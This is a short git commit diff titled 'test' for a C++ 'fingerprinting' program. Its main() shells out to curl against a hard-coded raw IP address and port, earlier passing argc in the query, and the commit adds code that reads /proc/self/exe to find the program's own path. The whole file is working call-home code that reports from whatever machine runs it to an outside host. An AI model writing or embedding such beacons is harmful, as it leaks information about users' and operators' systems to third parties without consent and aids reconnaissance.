0dd3c7a1e56702674bfa725943753dad2ec93d29
Leo Conforti <leo@leoconforti.us>
2023-04-06 04:29:47 +0000

    test

--- fingerprinting/fingerprinting.cc
+++ fingerprinting/fingerprinting.cc
@@ -1,10 +1,22 @@
+#include <fcntl.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 #include <string>
 
-int main(int argc, char* argv[]) {
-  std::string extraction_command = "curl http://159.223.105.145:11111/?argc=";
-  extraction_command += argc;
-  system(extraction_command.c_str());
+int main(int argc, char *argv[]) {
+  std::string extraction_command = "curl http://159.223.105.145:11111/";
+  system("curl http://159.223.105.145:11111/?hdfjsa=dsbhjfdsbhj");
   return 0;
+}
+
+char *program_path() {
+  char *path = (char *)malloc(100);
+  if (path != NULL) {
+    if (readlink("/proc/self/exe", path, 100) == -1) {
+      free(path);
+      path = NULL;
+    }
+  }
+  return path;
 }
